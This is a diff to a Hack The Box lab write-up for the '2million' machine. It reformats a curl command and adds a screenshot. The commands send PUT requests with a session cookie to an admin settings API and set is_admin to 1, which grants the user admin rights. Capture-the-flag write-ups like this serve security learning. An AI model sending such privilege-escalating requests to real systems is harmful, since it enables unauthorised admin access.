@@ -358,12 +358,17 @@ curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPS
 ```
 
 ```shell
-curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=dihm5b2fhtpggrecrhjnfm62h8" -H "Content-Type: application/json" -d '{"email":"root@pwnstuff.com", "is_admin":" "}' | jq
+> curl -s \
+-X PUT http://2million.htb/api/v1/admin/settings/update \
+-H "Cookie: PHPSESSID=dihm5b2fhtpggrecrhjnfm62h8" \
+-H "Content-Type: application/json" \
+-d '{"email":"root@pwnstuff.com", "is_admin":" "}' | jq
 {
   "status": "danger",
   "message": "Variable is_admin needs to be either 0 or 1."
 }
 ```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/9a30f25e-0b6e-4180-a6f7-5864608b282f)
 
 ```shell
 curl -s -X PUT http://2million.htb/api/v1/admin/settings/update -H "Cookie: PHPSESSID=dihm5b2fhtpggrecrhjnfm62h8" -H "Content-Type: application/json" -d '{"email":"root@pwnstuff.com", "is_admin":1}' | jq
